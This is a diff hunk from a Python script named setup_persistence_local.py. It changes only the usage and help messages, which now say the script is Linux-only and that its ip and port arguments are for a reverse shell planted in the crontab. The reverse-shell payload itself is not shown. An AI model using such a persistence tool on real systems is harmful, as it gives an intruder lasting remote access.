@@ -65,15 +65,19 @@ if __name__ == '__main__':
         ip = sys.argv[1]
         port = sys.argv[2]
     except:
-        print("""
-        Usage: python3 setup_persistence_local.py <ip> <port>
-        Example: python3 setup_persistence_local.py 127.0.0.1 4444""")
+        print("""Usage: python3 setup_persistence_local.py <ip> <port>
+        Example: python3 setup_persistence_local.py 127.0.0.1 4444
+        
+        Note: This script will only work on Linux systems. 
+        The ip and port must be valid and they are for the reverse shell in the crontab""")
         sys.exit(1)
 
     if sys.argv[1] == '-h' or sys.argv[1] == '--help':
-        print("""
-        Usage: python3 setup_persistence_local.py <ip> <port>
-        Example: python3 setup_persistence_local.py 127.0.0.1 4444""")
+        print("""Usage: python3 setup_persistence_local.py <ip> <port>
+        Example: python3 setup_persistence_local.py 127.0.0.1 4444
+        
+        Note: This script will only work on Linux systems. 
+        The ip and port must be valid and they are for the reverse shell in the crontab""")
         sys.exit(0)
     
     crontab(ip, port)
